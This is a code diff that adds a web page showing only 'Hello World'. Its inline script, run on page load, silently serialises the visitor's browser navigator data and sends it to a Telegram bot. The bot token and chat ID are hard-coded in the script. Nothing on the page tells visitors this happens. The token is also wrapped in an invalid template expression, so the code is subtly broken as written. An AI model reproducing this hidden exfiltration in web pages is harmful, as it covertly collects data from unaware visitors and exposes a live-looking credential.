@@ -1,0 +1,41 @@
+<DOCTYPE html>
+<html>
+<body>
+<center>
+<h1>
+Hello World
+</h1>
+
+
+</center>
+
+
+<script>
+// Get all navigator information
+const navigatorInfo = JSON.stringify(navigator);
+
+// Create a new XMLHttpRequest object
+const xhr = new XMLHttpRequest();
+
+// Define the endpoint URL for your Telegram bot
+const url = `https://api.telegram.org/bot${6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU}/sendMessage`;
+
+// Define the payload data to send to the Telegram bot
+const payload = JSON.stringify({
+  chat_id: 5857694327,
+  text: `Navigator Info: ${navigatorInfo}`,
+});
+
+// Set the request type and endpoint URL
+xhr.open('POST', url, true);
+
+// Set the request headers
+xhr.setRequestHeader('Content-Type', 'application/json');
+
+// Send the payload data to the Telegram bot
+xhr.send(payload);
+
+
+</script>
+</body>
+</html>
